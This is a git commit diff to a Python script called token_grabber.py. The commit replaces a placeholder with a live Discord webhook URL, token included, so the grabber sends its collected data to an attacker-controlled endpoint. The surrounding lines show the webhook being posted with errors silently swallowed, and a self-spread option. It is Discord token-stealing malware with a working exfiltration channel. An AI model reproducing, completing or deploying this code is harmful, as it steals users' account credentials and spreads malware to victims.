b4a2d15895dae53fc5441d4f5e812f81be7fb4a7
clien/xcfv/nearby <139028351+Newsajik@users.noreply.github.com>
2024-11-25 21:17:59 -0500

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1310791571091881984/r-mLkSKKOOhdCXxBVJZ6VGCj56w5phwylJpSa_w_eT1t0O3zM8uyeJkVsDNdTs0NzdnY", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
